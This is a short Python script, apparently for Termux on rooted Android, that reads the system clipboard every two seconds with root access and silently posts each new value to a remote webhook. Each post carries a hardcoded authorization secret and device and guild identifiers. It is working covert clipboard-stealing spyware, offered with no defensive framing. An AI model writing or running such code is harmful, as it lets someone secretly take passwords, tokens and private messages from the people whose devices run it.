import sys
import time
import subprocess
import requests

if len(sys.argv) < 3:
    sys.exit(1)

device_id = sys.argv[1]
guild_id = sys.argv[2]
URL_WEBHOOK = "https://hapiephoneugph.vercel.app/api/webhook"
AUTH_SECRET = "ugphoneoficialbrasil13willianz4z4oof$$$pitucho13"
headers = {"Content-Type": "application/json", "Authorization": AUTH_SECRET}

subprocess.run("termux-wake-lock", shell=True, check=False)

def get_clipboard_invisivel():
    try:
        output = subprocess.check_output('/system/bin/su -c "cmd clipboard get-text"', shell=True, stderr=subprocess.DEVNULL).decode('utf-8').strip()
        if output == "null" or output == "":
            return ""
        return output
    except Exception:
        return ""

last_clip = get_clipboard_invisivel()

while True:
    try:
        current = get_clipboard_invisivel()
        
        if current and current != last_clip:
            try:
                requests.post(URL_WEBHOOK, json={"texto": current, "device_id": device_id, "guild_id": guild_id}, headers=headers, timeout=5)
                last_clip = current
                
                try:
                    with open("last_activity.txt", "w") as f:
                        f.write(str(time.time()))
                except:
                    pass
            except:
                pass
    except:
        pass
        
    time.sleep(2)
